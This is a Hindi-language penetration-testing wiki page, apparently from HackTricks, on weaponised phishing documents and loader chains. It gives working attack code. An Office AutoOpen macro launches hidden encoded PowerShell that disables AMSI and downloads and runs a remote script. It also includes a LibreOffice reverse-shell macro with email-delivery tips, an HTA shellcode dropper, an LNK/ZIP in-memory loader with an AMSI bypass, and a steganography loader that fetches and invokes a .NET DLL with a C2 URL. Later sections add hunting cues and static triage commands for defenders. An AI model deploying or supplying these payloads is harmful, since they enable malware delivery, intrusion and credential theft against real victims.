# Phishing फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word किसी फ़ाइल को खोलने से पहले उसके फ़ाइल डेटा का validation करता है। Data validation, OfficeOpenXML standard के अनुसार data structure identification के रूप में किया जाता है। यदि data structure identification के दौरान कोई error होता है, तो analyse की जा रही फ़ाइल को खोला नहीं जाएगा।

आमतौर पर, macros वाली Word फ़ाइलें `.docm` extension का उपयोग करती हैं। हालांकि, file extension बदलकर फ़ाइल का नाम बदलना और फिर भी उसकी macro executing capabilities बनाए रखना संभव है।\
उदाहरण के लिए, RTF फ़ाइल macros को support नहीं करती, यह design के अनुसार है, लेकिन RTF के नाम से बदली गई DOCM फ़ाइल को Microsoft Word द्वारा handle किया जाएगा और वह macro execution करने में सक्षम होगी।\
यही internals और mechanisms Microsoft Office Suite के सभी software (Excel, PowerPoint आदि) पर लागू होते हैं।

आप निम्न command का उपयोग करके जाँच सकते हैं कि कुछ Office programs द्वारा कौन-सी extensions execute की जाएँगी:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files जो किसी remote template (File –Options –Add-ins –Manage: Templates –Go) को reference करती हैं और जिसमें macros शामिल होते हैं, वे भी macros को “execute” कर सकती हैं।

### External Image Load

यहाँ जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, और **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: यहाँ जाएँ: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Document से arbitrary code चलाने के लिए macros का उपयोग करना संभव है।

#### Autoload functions

वे जितने अधिक common होंगे, AV द्वारा उनका detect किया जाना उतना ही अधिक probable होगा।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मेटाडेटा को मैन्युअल रूप से हटाना

**File > Info > Inspect Document > Inspect Document** पर जाएँ, जिससे Document Inspector खुलेगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के आगे **Remove All** पर क्लिक करें।

#### Doc Extension

काम पूरा होने पर **Save as type** dropdown चुनें और format को **`.docx`** से बदलकर **Word 97-2003 `.doc`** कर दें।\
ऐसा इसलिए करें क्योंकि आप **`.docx` के अंदर macro's save नहीं कर सकते** और macro-enabled **`.docm`** extension के **around** एक **stigma** है (जैसे thumbnail icon पर बड़ा `!` होता है और कुछ web/email gateway इन्हें पूरी तरह block कर देते हैं)। इसलिए, यह **legacy `.doc` extension सबसे अच्छा compromise है**।

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents, Basic macros को embed कर सकते हैं और file खुलने पर उन्हें auto-execute कर सकते हैं, इसके लिए macro को **Open Document** event से bind करें (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> एक simple reverse shell macro इस प्रकार दिखता है:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
ध्यान दें कि स्ट्रिंग के अंदर दोहरे quotes (`""`) हैं – LibreOffice Basic literal quotes को escape करने के लिए इनका उपयोग करता है, इसलिए `...==""")` पर समाप्त होने वाले payloads में आंतरिक command और Shell argument दोनों संतुलित रहते हैं।

Delivery tips:

- `.odt` के रूप में save करें और macro को document event से bind करें, ताकि document खोलते ही यह तुरंत execute हो।
- `swaks` से email भेजते समय `--attach @resume.odt` का उपयोग करें (`@` आवश्यक है, ताकि filename string के बजाय file bytes attachment के रूप में भेजे जाएँ)। यह उन SMTP servers का दुरुपयोग करते समय महत्वपूर्ण है जो validation के बिना मनमाने `RCPT TO` recipients स्वीकार करते हैं।

## HTA Files

HTA एक Windows program है जो **HTML और scripting languages (जैसे VBScript और JScript) को combine करता है**। यह user interface generate करता है और browser के security model की constraints के बिना, एक "fully trusted" application के रूप में execute होता है।

HTA को **`mshta.exe`** का उपयोग करके execute किया जाता है, जो आमतौर पर **Internet Explorer** के साथ **installed** होता है, जिससे **`mshta` IE पर dependant** रहता है। इसलिए यदि इसे uninstall कर दिया गया है, तो HTAs execute नहीं हो पाएँगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication को बाध्य करना

**NTLM authentication को "remotely" बाध्य करने** के कई तरीके हैं, उदाहरण के लिए, आप उन emails या HTML में **invisible images** जोड़ सकते हैं जिन्हें user access करेगा (यहां तक कि HTTP MitM भी?)। या victim को **files के addresses** भेज सकते हैं, जो केवल **folder खोलने** पर ही **authentication** को **trigger** करेंगे।

**इन ideas और अन्य तरीकों को निम्नलिखित pages पर देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication चुरा ही नहीं सकते, बल्कि **NTLM relay attacks** भी **perform** कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Highly effective campaigns एक ZIP deliver करती हैं जिसमें दो legitimate decoy documents (PDF/DOCX) और एक malicious .lnk होता है। Trick यह है कि actual PowerShell loader, एक unique marker के बाद ZIP के raw bytes के अंदर stored होता है, और .lnk उसे carve करके पूरी तरह memory में run करता है।<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner द्वारा implemented typical flow:

1) Common paths में original ZIP locate करें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory के parent में।
2) ZIP bytes को read करें और एक hardcoded marker (जैसे xFIQCV) खोजें। Marker के बाद का सब कुछ embedded PowerShell payload है।
3) ZIP को %ProgramData% में copy करें, वहीं extract करें, और legitimate दिखने के लिए decoy .docx खोलें।
4) Current process के लिए AMSI bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Next stage को deobfuscate करें (जैसे सभी # characters हटाकर) और उसे memory में execute करें।

Embedded stage को carve और run करने के लिए Example PowerShell skeleton:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
नोट्स
- Delivery अक्सर reputable PaaS subdomains (जैसे, *.herokuapp.com) का दुरुपयोग करता है और payloads को gate कर सकता है (IP/UA के आधार पर benign ZIPs serve करता है)।
- अगला stage अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts को न्यूनतम रखने के लिए उसे Reflection.Emit + VirtualAlloc के माध्यम से execute करता है।

इसी chain में उपयोग की गई Persistence
- Microsoft Web Browser control का COM TypeLib hijacking, ताकि IE/Explorer या इसे embed करने वाला कोई भी app payload को अपने-आप re-launch कर दे।<sup>[[2]](#references)[[4]](#references)</sup> Details और ready-to-use commands यहां देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ऐसे ZIP files जिनमें archive data के अंत में ASCII marker string (जैसे, xFIQCV) append की गई हो।
- ऐसा .lnk जो ZIP का पता लगाने के लिए parent/user folders को enumerate करता है और एक decoy document खोलता है।
- [System.Management.Automation.AmsiUtils]::amsiInitFailed के माध्यम से AMSI tampering।
- Trusted PaaS domains के अंतर्गत hosted links के साथ समाप्त होने वाली long-running business threads।

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

एक अन्य recurring pattern एक **document-impersonating `.lnk`** है, जो background में real chain को stage करते हुए तुरंत एक benign lure खोलता है।<sup>[[3]](#references)</sup>

Observed workflow:
1. Shortcut **PDF का रूप धारण करता है** और obfuscated PowerShell downloader को spawn करने के लिए `conhost.exe` या इसी तरह के proxy का उपयोग करता है।
2. PowerShell obvious tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) को fragment करता है, इसलिए `iwr`, `gci`, `ren`, `cpi` या `schtasks` को खोजने वाले naive detections command को miss कर देते हैं।
3. Stager पहले **decoy document download** करता है, victim के लिए उसे खोलता है, और फिर background में malicious files को reconstruct करता है।
4. Payloads को **junk extensions** के साथ लिखा जा सकता है और फिर filler characters हटाकर उनका नाम बदला जा सकता है, जिससे obvious `.exe` / `.cpl` artifacts दिखाई देने में देरी होती है।
5. एक **minute-based scheduled task** के माध्यम से Persistence स्थापित की जाती है, जो user-writable path से trusted host binary launch करता है।

इस pattern से मिलने वाले minimal hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
पहचानने योग्य एक उपयोगी staging layout है:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` या `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### दूसरा stage stealthy क्यों है

Rapid7 case study में, scheduled task ने बार-बार **`Fondue.exe`** को `C:\Users\Public\` से launch किया। क्योंकि **`APPWIZ.cpl`** को इसके पास staged किया गया था और यह **`RunFODW`** export करता था, trusted Microsoft binary ने legitimate system copy के बजाय attacker CPL को side-load कर लिया।

इसके बाद CPL:
- `C:\Windows\Tasks\editor.dat` से एक **AES-256-CBC** blob पढ़ता है
- इसे **Windows CNG / `bcrypt.dll`** के माध्यम से decrypt करता है
- executable memory allocate करता है और decrypted shellcode को उसमें copy करता है
- **`EnumUILanguagesW`** के callback के रूप में shellcode pointer पास करके इसे indirectly execute करता है

यह अंतिम चरण अलग से hunt करने योग्य है: malware अक्सर direct `((void(*)())buf)()` jump से बचता है और execution transfer करने के लिए इसके बजाय **legitimate callback-taking WinAPI** का दुरुपयोग करता है।

इस campaign में decrypted payload **Donut** shellcode था, जिसने final PE को पूरी तरह memory में map किया और execution hand off करने से पहले current process में **AMSI/WLDP/ETW** को patch किया। side-loading और memory-resident post-processing पर गहन notes के लिए देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Practical hunting pivots:
- `.lnk` द्वारा `powershell.exe` या `conhost.exe` को spawn करना और उसके बाद एक दिखाई देने वाला decoy document।
- **`C:\Users\Public\`** में short-lived downloads, और उनके बाद nonsense extensions से तत्काल renames।
- `GoogleErrorReport` जैसे साधारण नामों वाले scheduled tasks, जो **user-writable directories** से execute होते हैं।
- Trusted binaries द्वारा उसी non-system directory से **`.cpl` / `.dll`** files load करना।
- **`C:\Windows\Tasks\`** के अंतर्गत लिखे गए Base64 text blobs, जिन्हें बाद में side-loaded module पढ़ता है।

## Images में steganography-delimited payloads (PowerShell stager)

Recent loader chains एक obfuscated JavaScript/VBS deliver करते हैं, जो decode करके Base64 PowerShell stager run करता है। वह stager एक image (अक्सर GIF) download करता है, जिसमें plain text के रूप में unique start/end markers के बीच छिपी Base64-encoded .NET DLL होती है। Script इन delimiters को खोजता है (जंगल में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>»), उनके बीच का text extract करता है, उसे Base64-decode करके bytes में बदलता है, assembly को memory में load करता है और C2 URL के साथ एक ज्ञात entry method invoke करता है।<sup>[[5]](#references)</sup>

कार्यप्रवाह
- Stage 1: Archived JS/VBS dropper → embedded Base64 को decode करता है → `-nop -w hidden -ep bypass` के साथ PowerShell stager launch करता है।
- Stage 2: PowerShell stager → image download करता है, marker-delimited Base64 carve करता है, .NET DLL को memory में load करता है और C2 URL तथा options पास करके उसकी method (जैसे, VAI) call करता है।
- Stage 3: Loader final payload retrieve करता है और आमतौर पर उसे process hollowing के माध्यम से trusted binary (सामान्यतः MSBuild.exe) में inject करता है।<sup>[[7]](#references)[[8]](#references)</sup> process hollowing और trusted utility proxy execution के बारे में यहां अधिक देखें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Image से DLL carve करके .NET method को memory में invoke करने का PowerShell example:

<details>
<summary>PowerShell stego payload extractor और loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है।<sup>[[6]](#references)</sup> Markers अलग-अलग campaigns में अलग हो सकते हैं।
- Assembly को load करने से पहले AMSI/ETW bypass और string deobfuscation सामान्य रूप से लागू किए जाते हैं।
- Hunting: डाउनलोड की गई images को ज्ञात delimiters के लिए scan करें; images को access करने और तुरंत Base64 blobs को decode करने वाले PowerShell की पहचान करें।

stego tools और carving techniques भी देखें:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार दिखाई देने वाला initial stage एक छोटा, अत्यधिक-obfuscated `.js` या `.vbs` होता है, जिसे archive के अंदर deliver किया जाता है। इसका एकमात्र उद्देश्य embedded Base64 string को decode करना और `-nop -w hidden -ep bypass` के साथ PowerShell launch करना होता है, ताकि HTTPS के माध्यम से next stage को bootstrap किया जा सके।<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- अपनी file contents पढ़ें
- junk strings के बीच Base64 blob का पता लगाएँ
- ASCII PowerShell में decode करें
- `powershell.exe` को invoke करते हुए `wscript.exe`/`cscript.exe` के साथ execute करें

Hunting cues
- Archived JS/VBS attachments, जो command line में `-enc`/`FromBase64String` के साथ `powershell.exe` spawn करते हैं।
- User temp paths से `powershell.exe -nop -w hidden` launch करने वाला `wscript.exe`।

## Execution containers के रूप में MSC documents (GrimResource)

Microsoft Management Console files (`.msc`) XML console definitions होती हैं, जिन्हें सामान्यतः `mmc.exe` खोलता है। **GrimResource** एक `StringTable` reference को weaponize करता है, जो पुराने XSS primitive वाले `apds.dll` resource की ओर point करता है; इसलिए user के crafted console खोलने पर JavaScript `mmc.exe` के अंदर run होता है। देखे गए samples में `transformNode`-based obfuscation को **DotNetToJScript** के साथ combine किया गया था, जिससे सामान्य Office-macro path के बिना .NET payload instantiate किया जा सके।<sup>[[9]](#references)</sup>

Static triage के लिए, untrusted MSC को text की तरह treat करें और उसे **double-click न करें**:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
High-signal runtime pivots में `mmc.exe` का CLR या script components लोड करना, network connections बनाना, या `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` अथवा किसी अप्रत्याशित executable को spawn करना शामिल है। यह format legitimate है, इसलिए detections को हर MSC को block करने के बजाय **origin + suspicious XML/script content + `mmc.exe` behavior** को correlate करना चाहिए।<sup>[[9]](#references)</sup>

## PDF/QR redirectors और payload gating

PDF के उपयोगी होने के लिए exploit आवश्यक नहीं है। हालिया campaigns में benign-looking document के अंदर **QR code या ordinary link** रखा जाता है, browser session को mail controls से दूर ले जाया जाता है, और destination को recipient address के अनुसार personalize किया जाता है। Microsoft ने 2025 के ऐसे PDFs को document किया जिनके QR URLs प्रत्येक recipient के लिए unique थे और RaccoonO365 credential-harvesting infrastructure तक ले जाते थे; एक parallel chain में IP/environment gating का उपयोग करके selected visitors को JavaScript/MSI path लौटाया गया, जबकि scanners या disallowed clients को benign PDF दिया गया।<sup>[[10]](#references)</sup>

PDF actions और rendered QR codes—दोनों की triage करें। QR vector-drawn हो सकता है और extractable image के रूप में stored नहीं हो सकता, इसलिए embedded images extract करने के साथ-साथ हर page को rasterize भी करें:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
किसी isolated analysis system से बिना authenticate किए decoded destinations और redirects का निरीक्षण करें। उपयोगी hunting features में लगभग खाली mail bodies वाले केवल-QR PDFs, query parameter में embedded recipient email, reputable hosting के माध्यम से कई redirects, और IP, geolocation, cookies, referrer या user agent के अनुसार लौटाई जाने वाली अलग-अलग content शामिल हैं। Controlled profiles के साथ requests की तुलना करें, क्योंकि एक single sandbox fetch को केवल decoy मिल सकता है।<sup>[[10]](#references)</sup>

## Windows files to steal NTLM hashes

**NTLM creds चुराने के स्थानों** के बारे में page देखें:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: US कंपनियों को target करने वाला एक sophisticated Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-themed Loader Chain के माध्यम से Dropping Elephant Tradecraft को track करना](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – नई COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader कई प्रकार के Infostealers deliver करता है](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: initial access और evasion के लिए Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors tax season का लाभ उठाकर tax-themed phishing campaigns deploy करते हैं](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
